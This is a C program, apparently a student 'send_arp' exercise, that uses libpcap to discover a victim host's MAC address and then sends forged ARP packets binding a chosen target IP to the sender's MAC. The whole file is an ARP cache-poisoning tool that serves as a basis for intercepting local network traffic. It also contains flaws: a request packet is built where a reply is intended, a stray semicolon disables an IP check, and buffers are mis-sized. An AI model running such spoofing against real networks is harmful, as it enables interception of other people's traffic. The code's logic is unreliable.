#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>  
#include <sys/stat.h> 
#include <net/if.h>
#include <sys/socket.h> 
#include <unistd.h>

#pragma pack(push, 1)
typedef struct arp_packet
{
	uint8_t ether_dest_mac[6];
	uint8_t ether_src_mac[6];
	uint16_t ether_type;
	uint16_t hw_type;
	uint16_t proto_type;
	uint8_t hw_length;
	uint8_t proto_length;
	uint16_t packet_type;	
	uint8_t src_mac[6];
	uint8_t src_ip[4];
	uint8_t dest_mac[6];
	uint8_t dest_ip[4];
}arp_packet;


#define BROADCAST "\xff\xff\xff\xff\xff\xff"
#define UNKNOW "\x00\x00\x00\x00\x00\x00"
#define ETHERNET 0x0100

void usage() {
printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void convert_mac(const char *data, unsigned char *result, int sz)
{
	char buf[128] = {0,};
	char t_buf[8];
	char *stp = strtok( (char *)data , ":" );
	int temp=0, i = 0;
	do
	{
	  memset( t_buf, 0, sizeof(t_buf) );
	  sscanf( stp, "%x", &temp );
	  snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
	  result[i++] = temp;
	} while( (stp = strtok( NULL , ":" )) != NULL );
}

int GetMacAddress(const char *ifr, unsigned char *mac)
{
	int sock;
	struct ifreq ifrq;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock < 0) 
		return -1;

	strcpy(ifrq.ifr_name, ifr);

	if (ioctl(sock, SIOCGIFHWADDR, &ifrq)< 0)    
	{
		close(sock);
		return -1;
	}

	convert_mac( ether_ntoa((struct ether_addr *)(ifrq.ifr_hwaddr.sa_data)), mac, sizeof(mac) -1 );
	
	close(sock);
	return 1;

}

int GetIpAddress(const char *ifr, unsigned char *ip)
{  
	int sockfd;  
	struct ifreq ifrq; 
	struct sockaddr_in * sin;  

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
	strcpy(ifrq.ifr_name, ifr);  
	if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
	perror( "ioctl() SIOCGIFADDR error");  
	return -1;  
	}  
	sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
	memcpy (ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));  
	
	close(sockfd);  

	return 1;  
}

void packet_to_arp_reply(arp_packet *buf)
{
        buf->hw_type = ETHERNET;
        buf->proto_type = htons(ETHERTYPE_IP);
        buf->hw_length = 6;
        buf->proto_length = 4;
        buf->packet_type = htons(ARPOP_REPLY);
}

void packet_to_arp_request(arp_packet *buf)
{
	buf->hw_type = ETHERNET;
	buf->proto_type = htons(ETHERTYPE_IP);
	buf->hw_length = 6;
	buf->proto_length = 4;
	buf->packet_type = htons(ARPOP_REQUEST);
}

void fill_address(arp_packet *buf, unsigned char src_mac[], unsigned char src_ip[], unsigned char dest_mac[], unsigned char dest_ip[])
{
	int i;

	for(i = 0; i < 6; i++)
	{
		buf->src_mac[i] = src_mac[i];
		buf->dest_mac[i] = dest_mac[i];
	}

	for(i = 0; i < 4; i++)
	{
		buf->src_ip[i] = src_ip[i];
		buf->dest_ip[i] = dest_ip[i];
	}
}

void fill_ethernet(arp_packet *buf, unsigned char dest[], unsigned char src[])
{
	int i;

	for(i = 0; i < 6; i++)
	{
		buf->ether_dest_mac[i] = dest[i];
		buf->ether_src_mac[i] = src[i];
	}	

	buf->ether_type = htons(ETHERTYPE_ARP);
}

void CatchMac(const u_char *packet, unsigned char mac[])
{
	for(int i = 0; i < 6; i++)
		mac[i] = *(packet + i + 6);
}

int check_ip(const u_char *packet, unsigned char *dest_ip)
{
	struct arp_packet *packet_arp;

	packet_arp = (struct arp_packet *)packet;	

	if( packet_arp->src_ip[0] == dest_ip[0] &&  packet_arp->src_ip[1] == dest_ip[1] && packet_arp->src_ip[2] == dest_ip[2] && packet_arp->src_ip[3] == dest_ip[3] )
		return 1;

	return 0;
}

int check_arp(const u_char *packet)
{
	struct ether_header *packet_ether;

	packet_ether = (struct ether_header *)packet;

	if(ntohs(packet_ether->ether_type) == ETHERTYPE_ARP)	
		return 1;

	return 0;
}

void GetSenderMac(arp_packet *buf, char *dev, unsigned char *dest_ip, unsigned char *sender_mac)
{
	pcap_t *recv;
	int flag = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;
	const u_char *packet;
	int res;

	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	while( true )
	{
			recv = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
		
			if( pcap_sendpacket(handle, (const u_char *)buf, sizeof(arp_packet)) == -1)
		                printf("Send Failed...\n");

			pcap_next_ex(recv, &header, &packet);
			res = pcap_next_ex(recv, &header, &packet);
			
			if (res == 0) continue;
			if (res == -1 || res == -2) break;

			if(check_arp(packet))
			{	
				if(check_ip(packet, dest_ip));
				{
					flag++;
					CatchMac(packet, sender_mac);
				}
			}

			if(flag) break;	
	}

	pcap_close(recv);	
	pcap_close(handle);	
}

void make_packet(arp_packet *result, unsigned char *ether_dest_mac, unsigned char *ether_src_mac, int arp_type, unsigned char *arp_src_mac, unsigned char *arp_src_ip, unsigned char *arp_dest_mac, unsigned char *arp_dest_ip)
{
	fill_ethernet(result, ether_dest_mac, ether_src_mac);

	if(arp_type == ARPOP_REQUEST)
		packet_to_arp_request(result);

	else
		packet_to_arp_request(result);

	fill_address(result, arp_src_mac, arp_src_ip, arp_dest_mac, arp_dest_ip); 
}

void arp_spoofing(char *dev, arp_packet *payload)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s : %s\n", dev, errbuf);
		exit(-1);
	}

	pcap_sendpacket(handle,	(const u_char *)payload, sizeof(arp_packet));
}

int main(int argc, char *argv[]) 
{
	if (argc != 4) 
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	unsigned char src_ip[4];
	unsigned char dest_ip[4];
	unsigned char my_mac[6] = {0, };
	unsigned char sender_mac[6] = {0,};
	unsigned char target_ip[6] = {0,};
	arp_packet *buf = (arp_packet *)malloc(sizeof(arp_packet));
	arp_packet *payload = (arp_packet *)malloc(sizeof(arp_packet));

	inet_pton(AF_INET, argv[3], target_ip);
	inet_pton(AF_INET, argv[2], dest_ip);

	if( GetIpAddress(argv[1], src_ip) != 1 )
	{
		printf("Failed Get Address\n");
		return 0; 
	}

	if( GetMacAddress(argv[1], my_mac) != 1 )
	{
		printf("Failed Get Address\n");
		return 0;
	}

	make_packet(buf, (unsigned char *)BROADCAST, my_mac, ARPOP_REQUEST, my_mac, src_ip, (unsigned char *)UNKNOW, dest_ip);
	GetSenderMac(buf, dev, dest_ip, sender_mac);
	
	make_packet(payload, sender_mac, my_mac, ARPOP_REPLY, my_mac, target_ip, sender_mac, dest_ip);
	for(int i = 0; i < 5; i++)
		arp_spoofing(dev, payload);

	free(buf);	
	free(payload);

	return 0;
}
